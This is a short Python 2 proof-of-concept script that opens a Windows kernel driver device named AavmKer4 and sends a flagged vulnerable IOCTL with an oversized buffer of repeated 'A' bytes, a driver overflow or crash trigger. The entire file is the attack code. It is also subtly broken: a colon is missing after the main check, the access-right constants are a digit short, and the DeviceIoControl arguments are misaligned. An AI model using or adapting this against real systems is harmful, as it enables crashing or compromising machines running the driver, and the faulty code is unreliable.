#!/usr/bin/python

from ctypes import *
import struct

kernel32 = windll.kernel32

if __name__ == '__main__'
    GENERIC_READ = 0x8000000
    GENERIC_WRITE = 0x4000000
    OPEN_EXISTING = 0x3
    IOCTL_VULN = 0xb2d60030
    DEVICE_NAME = "\\\\.\\AavmKer4"
    dwReturn = c_ulong()
    evil_size = 0x878
    evil_input = "\x41" * evil_size
    out_size = 0x1024
    evil_output = ""
    driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
    if driver_handle:
        print "(+) Talking to the driver sending vulnerable IOCTL..."
        dev_ioctl = kernel32.DeviceIoControl(
            driver_handle,
            IOCTL_VULN,
            evil_input,
            evil_output,
            out_size,
            byref(dwReturn),
            None
        )
    